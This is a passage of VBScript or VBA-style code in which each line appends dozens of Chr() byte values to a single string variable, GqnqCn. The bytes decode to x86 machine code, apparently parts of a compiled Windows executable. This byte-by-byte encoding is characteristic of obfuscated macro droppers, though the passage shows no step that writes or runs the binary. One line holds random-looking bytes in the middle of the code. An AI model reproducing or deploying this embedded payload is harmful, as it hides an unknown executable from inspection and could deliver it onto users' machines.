GqnqCn=GqnqCn&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(36)&Chr(101)&Chr(64)&Chr(0)&Chr(44)&Chr(101)&Chr(64)&Chr(0)&Chr(56)&Chr(101)&Chr(64)&Chr(0)&Chr(76)&Chr(101)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(141)&Chr(116)&Chr(49)&Chr(252)&Chr(141)&Chr(124)&Chr(57)&Chr(252)&Chr(247)&Chr(199)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(36)
GqnqCn=GqnqCn&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(226)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(13)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(247)&Chr(217)&Chr(255)&Chr(36)&Chr(141)&Chr(96)&Chr(102)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(139)&Chr(199)&Chr(186)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(249)&Chr(4)&Chr(114)&Chr(12)&Chr(131)&Chr(224)&Chr(3)&Chr(43)&Chr(200)&Chr(255)&Chr(36)&Chr(133)&Chr(180)&Chr(101)&Chr(64)&Chr(0)&Chr(255)&Chr(36)&Chr(141)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(144)&Chr(196)&Chr(101)&Chr(64)&Chr(0)&Chr(232)&Chr(101)&Chr(64)&Chr(0)&Chr(16)&Chr(102)&Chr(64)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)&Chr(131)&Chr(238)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(239)&Chr(1)&Chr(131)&Chr(249)&Chr(8)
GqnqCn=GqnqCn&Chr(114)&Chr(178)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(131)&Chr(238)&Chr(2)&Chr(131)&Chr(239)&Chr(2)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(136)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(138)&Chr(70)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(1)&Chr(131)&Chr(238)&Chr(3)&Chr(131)&Chr(239)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(15)&Chr(130)&Chr(86)&Chr(255)&Chr(255)&Chr(255)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)
GqnqCn=GqnqCn&Chr(149)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(100)&Chr(102)&Chr(64)&Chr(0)&Chr(108)&Chr(102)&Chr(64)&Chr(0)&Chr(116)&Chr(102)&Chr(64)&Chr(0)&Chr(124)&Chr(102)&Chr(64)&Chr(0)&Chr(132)&Chr(102)&Chr(64)&Chr(0)&Chr(140)&Chr(102)&Chr(64)&Chr(0)&Chr(148)&Chr(102)&Chr(64)&Chr(0)&Chr(167)&Chr(102)&Chr(64)&Chr(0)&Chr(139)&Chr(68)&Chr(142)&Chr(28)&Chr(137)&Chr(68)&Chr(143)&Chr(28)&Chr(139)&Chr(68)&Chr(142)&Chr(24)&Chr(137)&Chr(68)&Chr(143)&Chr(24)&Chr(139)&Chr(68)&Chr(142)&Chr(20)&Chr(137)&Chr(68)&Chr(143)&Chr(20)&Chr(139)&Chr(68)&Chr(142)&Chr(16)&Chr(137)&Chr(68)&Chr(143)&Chr(16)&Chr(139)&Chr(68)&Chr(142)&Chr(12)&Chr(137)&Chr(68)&Chr(143)&Chr(12)&Chr(139)&Chr(68)&Chr(142)&Chr(8)&Chr(137)&Chr(68)&Chr(143)&Chr(8)&Chr(139)&Chr(68)&Chr(142)&Chr(4)&Chr(137)&Chr(68)&Chr(143)&Chr(4)&Chr(141)&Chr(4)&Chr(141)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(3)&Chr(240)&Chr(3)&Chr(248)&Chr(255)&Chr(36)&Chr(149)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(192)&Chr(102)&Chr(64)&Chr(0)&Chr(200)&Chr(102)&Chr(64)&Chr(0)&Chr(216)&Chr(102)&Chr(64)&Chr(0)&Chr(236)&Chr(102)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)
GqnqCn=GqnqCn&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(129)&Chr(236)&Chr(40)&Chr(3)&Chr(0)&Chr(0)&Chr(163)&Chr(208)&Chr(179)&Chr(64)&Chr(0)&Chr(137)&Chr(13)&Chr(204)&Chr(179)&Chr(64)&Chr(0)&Chr(137)&Chr(21)&Chr(200)&Chr(179)&Chr(64)&Chr(0)&Chr(137)&Chr(29)&Chr(196)&Chr(179)&Chr(64)&Chr(0)&Chr(137)&Chr(53)&Chr(192)&Chr(179)&Chr(64)&Chr(0)&Chr(137)&Chr(61)&Chr(188)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(21)&Chr(232)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(13)&Chr(220)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(29)&Chr(184)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(5)&Chr(180)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(37)&Chr(176)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(45)&Chr(172)&Chr(179)&Chr(64)&Chr(0)&Chr(156)&Chr(143)&Chr(5)&Chr(224)&Chr(179)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(0)&Chr(163)
GqnqCn=GqnqCn&Chr(212)&Chr(179)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(4)&Chr(163)&Chr(216)&Chr(179)&Chr(64)&Chr(0)&Chr(141)&Chr(69)&Chr(8)&Chr(163)&Chr(228)&Chr(179)&Chr(64)&Chr(0)&Chr(139)&Chr(133)&Chr(224)&Chr(252)&Chr(255)&Chr(255)&Chr(199)&Chr(5)&Chr(32)&Chr(179)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(161)&Chr(216)&Chr(179)&Chr(64)&Chr(0)&Chr(163)&Chr(212)&Chr(178)&Chr(64)&Chr(0)&Chr(199)&Chr(5)&Chr(200)&Chr(178)&Chr(64)&Chr(0)&Chr(9)&Chr(4)&Chr(0)&Chr(192)&Chr(199)&Chr(5)&Chr(204)&Chr(178)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(137)&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(161)&Chr(252)&Chr(169)&Chr(64)&Chr(0)&Chr(137)&Chr(133)&Chr(220)&Chr(252)&Chr(255)&Chr(255)&Chr(255)&Chr(21)&Chr(156)&Chr(128)&Chr(64)&Chr(0)&Chr(163)&Chr(24)&Chr(179)&Chr(64)&Chr(0)&Chr(106)
GqnqCn=GqnqCn&Chr(1)&Chr(232)&Chr(136)&Chr(234)&Chr(255)&Chr(255)&Chr(89)&Chr(106)&Chr(0)&Chr(255)&Chr(21)&Chr(8)&Chr(128)&Chr(64)&Chr(0)&Chr(104)&Chr(28)&Chr(146)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(152)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(61)&Chr(24)&Chr(179)&Chr(64)&Chr(0)&Chr(0)&Chr(117)&Chr(8)&Chr(106)&Chr(1)&Chr(232)&Chr(100)&Chr(234)&Chr(255)&Chr(255)&Chr(89)&Chr(104)&Chr(9)&Chr(4)&Chr(0)&Chr(192)&Chr(255)&Chr(21)&Chr(148)&Chr(128)&Chr(64)&Chr(0)&Chr(80)&Chr(255)&Chr(21)&Chr(144)&Chr(128)&Chr(64)&Chr(0)&Chr(201)&Chr(195)&Chr(204)&Chr(85)&Chr(139)&Chr(236)&Chr(83)&Chr(86)&Chr(87)&Chr(85)&Chr(106)&Chr(0)&Chr(106)&Chr(0)&Chr(104)&Chr(36)&Chr(104)&Chr(64)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(250)&Chr(9)&Chr(0)&Chr(0)&Chr(93)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(139)&Chr(76)&Chr(36)&Chr(4)
GqnqCn=GqnqCn&Chr(247)&Chr(65)&Chr(4)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(184)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(50)&Chr(139)&Chr(68)&Chr(36)&Chr(20)&Chr(139)&Chr(72)&Chr(252)&Chr(51)&Chr(200)&Chr(232)&Chr(146)&Chr(231)&Chr(255)&Chr(255)&Chr(85)&Chr(139)&Chr(104)&Chr(16)&Chr(139)&Chr(80)&Chr(40)&Chr(82)&Chr(139)&Chr(80)&Chr(36)&Chr(82)&Chr(232)&Chr(20)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(8)&Chr(93)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(139)&Chr(84)&Chr(36)&Chr(16)&Chr(137)&Chr(2)&Chr(184)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(195)&Chr(83)&Chr(86)&Chr(87)&Chr(139)&Chr(68)&Chr(36)&Chr(16)&Chr(85)&Chr(80)&Chr(106)&Chr(254)&Chr(104)&Chr(44)&Chr(104)&Chr(64)&Chr(0)&Chr(100)&Chr(255)&Chr(53)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(196)&Chr(80)&Chr(141)&Chr(68)&Chr(36)&Chr(4)
GqnqCn=GqnqCn&Chr(100)&Chr(163)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(68)&Chr(36)&Chr(40)&Chr(139)&Chr(88)&Chr(8)&Chr(139)&Chr(112)&Chr(12)&Chr(131)&Chr(254)&Chr(255)&Chr(116)&Chr(58)&Chr(131)&Chr(124)&Chr(36)&Chr(44)&Chr(255)&Chr(116)&Chr(6)&Chr(59)&Chr(116)&Chr(36)&Chr(44)&Chr(118)&Chr(45)&Chr(141)&Chr(52)&Chr(118)&Chr(139)&Chr(12)&Chr(179)&Chr(137)&Chr(76)&Chr(36)&Chr(12)&Chr(137)&Chr(72)&Chr(12)&Chr(131)&Chr(124)&Chr(179)&Chr(4)&Chr(0)&Chr(117)&Chr(23)&Chr(104)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(68)&Chr(179)&Chr(8)&Chr(232)&Chr(73)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(68)&Chr(179)&Chr(8)&Chr(232)&Chr(95)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(183)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(100)&Chr(137)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(24)&Chr(95)&Chr(94)&Chr(91)&Chr(195)&Chr(51)&Chr(192)&Chr(100)
GqnqCn=GqnqCn&Chr(139)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(121)&Chr(4)&Chr(44)&Chr(104)&Chr(64)&Chr(0)&Chr(117)&Chr(16)&Chr(139)&Chr(81)&Chr(12)&Chr(139)&Chr(82)&Chr(12)&Chr(57)&Chr(81)&Chr(8)&Chr(117)&Chr(5)&Chr(184)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(195)&Chr(83)&Chr(81)&Chr(187)&Chr(32)&Chr(171)&Chr(64)&Chr(0)&Chr(235)&Chr(11)&Chr(83)&Chr(81)&Chr(187)&Chr(32)&Chr(171)&Chr(64)&Chr(0)&Chr(139)&Chr(76)&Chr(36)&Chr(12)&Chr(137)&Chr(75)&Chr(8)&Chr(137)&Chr(67)&Chr(4)&Chr(137)&Chr(107)&Chr(12)&Chr(85)&Chr(81)&Chr(80)&Chr(88)&Chr(89)&Chr(93)&Chr(89)&Chr(91)&Chr(194)&Chr(4)&Chr(0)&Chr(255)&Chr(208)&Chr(195)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(4)&Chr(137)&Chr(125)&Chr(252)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(77)&Chr(12)&Chr(193)&Chr(233)&Chr(7)&Chr(102)&Chr(15)&Chr(239)&Chr(192)&Chr(235)&Chr(8)&Chr(141)
GqnqCn=GqnqCn&Chr(164)&Chr(36)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(144)&Chr(102)&Chr(15)&Chr(127)&Chr(7)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(16)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(32)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(48)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(64)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(80)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(96)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(112)&Chr(141)&Chr(191)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(73)&Chr(117)&Chr(208)&Chr(139)&Chr(125)&Chr(252)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(137)&Chr(125)&Chr(252)&Chr(139)&Chr(69)&Chr(8)&Chr(153)&Chr(139)&Chr(248)&Chr(51)&Chr(250)&Chr(43)&Chr(250)&Chr(131)&Chr(231)&Chr(15)&Chr(51)&Chr(250)&Chr(43)&Chr(250)&Chr(133)&Chr(255)&Chr(117)&Chr(60)&Chr(139)&Chr(77)&Chr(16)&Chr(139)&Chr(209)&Chr(131)&Chr(226)&Chr(127)
GqnqCn=GqnqCn&Chr(137)&Chr(85)&Chr(244)&Chr(59)&Chr(202)&Chr(116)&Chr(18)&Chr(43)&Chr(202)&Chr(81)&Chr(80)&Chr(232)&Chr(115)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(8)&Chr(139)&Chr(69)&Chr(8)&Chr(139)&Chr(85)&Chr(244)&Chr(133)&Chr(210)&Chr(116)&Chr(69)&Chr(3)&Chr(69)&Chr(16)&Chr(43)&Chr(194)&Chr(137)&Chr(69)&Chr(248)&Chr(51)&Chr(192)&Chr(139)&Chr(125)&Chr(248)&Chr(139)&Chr(77)&Chr(244)&Chr(243)&Chr(170)&Chr(139)&Chr(69)&Chr(8)&Chr(235)&Chr(46)&Chr(247)&Chr(223)&Chr(131)&Chr(199)&Chr(16)&Chr(137)&Chr(125)&Chr(240)&Chr(51)&Chr(192)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(77)&Chr(240)&Chr(243)&Chr(170)&Chr(139)&Chr(69)&Chr(240)&Chr(139)&Chr(77)&Chr(8)&Chr(139)&Chr(85)&Chr(16)&Chr(3)&Chr(200)&Chr(43)&Chr(208)&Chr(82)&Chr(106)&Chr(0)&Chr(81)&Chr(232)&Chr(126)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(139)&Chr(69)&Chr(8)&Chr(139)&Chr(125)
GqnqCn=GqnqCn&Chr(252)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(24)&Chr(83)&Chr(255)&Chr(117)&Chr(16)&Chr(141)&Chr(77)&Chr(232)&Chr(232)&Chr(17)&Chr(203)&Chr(255)&Chr(255)&Chr(139)&Chr(93)&Chr(8)&Chr(141)&Chr(67)&Chr(1)&Chr(61)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(119)&Chr(15)&Chr(139)&Chr(69)&Chr(232)&Chr(139)&Chr(128)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(183)&Chr(4)&Chr(88)&Chr(235)&Chr(117)&Chr(137)&Chr(93)&Chr(8)&Chr(193)&Chr(125)&Chr(8)&Chr(8)&Chr(141)&Chr(69)&Chr(232)&Chr(80)&Chr(139)&Chr(69)&Chr(8)&Chr(37)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(232)&Chr(167)&Chr(2)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(18)&Chr(138)&Chr(69)&Chr(8)&Chr(106)&Chr(2)&Chr(136)&Chr(69)&Chr(248)&Chr(136)&Chr(93)&Chr(249)&Chr(198)&Chr(69)&Chr(250)&Chr(0)&Chr(89)
GqnqCn=GqnqCn&Chr(235)&Chr(10)&Chr(51)&Chr(201)&Chr(136)&Chr(93)&Chr(248)&Chr(198)&Chr(69)&Chr(249)&Chr(0)&Chr(65)&Chr(139)&Chr(69)&Chr(232)&Chr(106)&Chr(1)&Chr(255)&Chr(112)&Chr(20)&Chr(255)&Chr(112)&Chr(4)&Chr(141)&Chr(69)&Chr(252)&Chr(80)&Chr(81)&Chr(141)&Chr(69)&Chr(248)&Chr(80)&Chr(141)&Chr(69)&Chr(232)&Chr(106)&Chr(1)&Chr(80)&Chr(232)&Chr(167)&Chr(238)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(32)&Chr(133)&Chr(192)&Chr(117)&Chr(16)&Chr(56)&Chr(69)&Chr(244)&Chr(116)&Chr(7)&Chr(139)&Chr(69)&Chr(240)&Chr(131)&Chr(96)&Chr(112)&Chr(253)&Chr(51)&Chr(192)&Chr(235)&Chr(20)&Chr(15)&Chr(183)&Chr(69)&Chr(252)&Chr(35)&Chr(69)&Chr(12)&Chr(128)&Chr(125)&Chr(244)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(77)&Chr(240)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(91)&Chr(201)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)
GqnqCn=GqnqCn&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(81)&Chr(141)&Chr(76)&Chr(36)&Chr(8)&Chr(43)&Chr(200)&Chr(131)&Chr(225)&Chr(15)&Chr(3)&Chr(193)&Chr(27)&Chr(201)&Chr(11)&Chr(193)&Chr(89)&Chr(233)&Chr(106)&Chr(2)&Chr(0)&Chr(0)&Chr(81)&Chr(141)&Chr(76)&Chr(36)&Chr(8)&Chr(43)&Chr(200)&Chr(131)&Chr(225)&Chr(7)&Chr(3)&Chr(193)&Chr(27)&Chr(201)&Chr(11)&Chr(193)&Chr(89)&Chr(233)&Chr(84)&Chr(2)&Chr(0)&Chr(0)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(12)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(106)&Chr(6)&Chr(141)&Chr(69)&Chr(244)&Chr(80)&Chr(104)&Chr(4)&Chr(16)&Chr(0)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(198)&Chr(69)&Chr(250)&Chr(0)&Chr(255)&Chr(21)&Chr(204)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(5)&Chr(131)&Chr(200)&Chr(255)&Chr(235)&Chr(10)&Chr(141)
GqnqCn=GqnqCn&Chr(69)&Chr(244)&Chr(80)&Chr(232)&Chr(249)&Chr(1)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(77)&Chr(252)&Chr(51)&Chr(205)&Chr(232)&Chr(123)&Chr(228)&Chr(255)&Chr(255)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(52)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(139)&Chr(69)&Chr(16)&Chr(139)&Chr(77)&Chr(24)&Chr(137)&Chr(69)&Chr(216)&Chr(139)&Chr(69)&Chr(20)&Chr(83)&Chr(137)&Chr(69)&Chr(208)&Chr(139)&Chr(0)&Chr(86)&Chr(137)&Chr(69)&Chr(220)&Chr(139)&Chr(69)&Chr(8)&Chr(87)&Chr(51)&Chr(255)&Chr(137)&Chr(77)&Chr(204)&Chr(137)&Chr(125)&Chr(224)&Chr(137)&Chr(125)&Chr(212)&Chr(59)&Chr(69)&Chr(12)&Chr(15)&Chr(132)&Chr(95)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(168)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(77)&Chr(232)&Chr(81)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(29)
GqnqCn=GqnqCn&Chr(212)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(94)&Chr(131)&Chr(125)&Chr(232)&Chr(1)&Chr(117)&Chr(88)&Chr(141)&Chr(69)&Chr(232)&Chr(80)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(176)&Chr(28)&Chr(72)&Chr(37)&Chr(124)&Chr(0)&Chr(245)&Chr(169)&Chr(186)&Chr(63)&Chr(49)&Chr(249)&Chr(102)&Chr(59)&Chr(214)&Chr(52)&Chr(66)&Chr(180)&Chr(182)&Chr(146)&Chr(67)&Chr(185)&Chr(29)&Chr(36)&Chr(20)&Chr(159)&Chr(184)&Chr(141)&Chr(74)&Chr(136)&Chr(212)&Chr(73)&Chr(168)&Chr(178)&Chr(60)&Chr(152)&Chr(13)&Chr(21)&Chr(75)&Chr(153)&Chr(44)&Chr(181)&Chr(213)&Chr(183)&Chr(187)&Chr(64)&Chr(12)&Chr(45)&Chr(147)&Chr(179)&Chr(144)&Chr(39)&Chr(5)&Chr(47)&Chr(131)&Chr(252)&Chr(248)&Chr(233)&Chr(51)&Chr(226)&Chr(255)&Chr(255)&Chr(228)&Chr(254)&Chr(255)&Chr(255)&Chr(139)&Chr(196)&Chr(59)&Chr(199)&Chr(116)&Chr(56)&Chr(199)&Chr(0)&Chr(204)&Chr(204)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(235)&Chr(45)&Chr(87)&Chr(87)&Chr(255)&Chr(117)&Chr(220)&Chr(255)&Chr(117)&Chr(216)&Chr(106)&Chr(1)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(211)&Chr(139)&Chr(240)&Chr(59)&Chr(247)&Chr(117)&Chr(195)&Chr(51)&Chr(192)&Chr(233)&Chr(209)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(232)&Chr(175)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(59)&Chr(199)&Chr(116)&Chr(9)&Chr(199)&Chr(0)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(131)&Chr(192)&Chr(8)&Chr(137)&Chr(69)&Chr(228)&Chr(235)&Chr(3)&Chr(137)&Chr(125)&Chr(228)&Chr(57)&Chr(125)&Chr(228)&Chr(116)&Chr(216)&Chr(141)&Chr(4)&Chr(54)&Chr(80)&Chr(87)&Chr(255)&Chr(117)&Chr(228)&Chr(232)&Chr(12)&Chr(230)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(86)&Chr(255)&Chr(117)&Chr(228)&Chr(255)&Chr(117)&Chr(220)&Chr(255)&Chr(117)&Chr(216)&Chr(106)&Chr(1)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(211)&Chr(133)&Chr(192)&Chr(116)&Chr(127)
GqnqCn=GqnqCn&Chr(139)&Chr(93)&Chr(204)&Chr(59)&Chr(223)&Chr(116)&Chr(29)&Chr(87)&Chr(87)&Chr(255)&Chr(117)&Chr(28)&Chr(83)&Chr(86)&Chr(255)&Chr(117)&Chr(228)&Chr(87)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(21)&Chr(52)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(96)&Chr(137)&Chr(93)&Chr(224)&Chr(235)&Chr(91)&Chr(139)&Chr(29)&Chr(52)&Chr(128)&Chr(64)&Chr(0)&Chr(57)&Chr(125)&Chr(212)&Chr(117)&Chr(20)&Chr(87)&Chr(87)&Chr(87)&Chr(87)&Chr(86)&Chr(255)&Chr(117)&Chr(228)&Chr(87)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(211)&Chr(139)&Chr(240)&Chr(59)&Chr(247)&Chr(116)&Chr(60)&Chr(86)&Chr(106)&Chr(1)&Chr(232)&Chr(47)&Chr(209)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(137)&Chr(69)&Chr(224)&Chr(59)&Chr(199)&Chr(116)&Chr(43)&Chr(87)&Chr(87)&Chr(86)&Chr(80)&Chr(86)&Chr(255)&Chr(117)&Chr(228)&Chr(87)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(211)&Chr(59)&Chr(199)
GqnqCn=GqnqCn&Chr(117)&Chr(14)&Chr(255)&Chr(117)&Chr(224)&Chr(232)&Chr(57)&Chr(208)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(125)&Chr(224)&Chr(235)&Chr(11)&Chr(131)&Chr(125)&Chr(220)&Chr(255)&Chr(116)&Chr(5)&Chr(139)&Chr(77)&Chr(208)&Chr(137)&Chr(1)&Chr(255)&Chr(117)&Chr(228)&Chr(232)&Chr(147)&Chr(230)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(69)&Chr(224)&Chr(141)&Chr(101)&Chr(192)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(77)&Chr(252)&Chr(51)&Chr(205)&Chr(232)&Chr(199)&Chr(226)&Chr(255)&Chr(255)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(141)&Chr(77)&Chr(240)&Chr(232)&Chr(34)&Chr(200)&Chr(255)&Chr(255)&Chr(15)&Chr(182)&Chr(69)&Chr(8)&Chr(139)&Chr(77)&Chr(240)&Chr(139)&Chr(137)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(183)&Chr(4)&Chr(65)&Chr(37)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(128)&Chr(125)
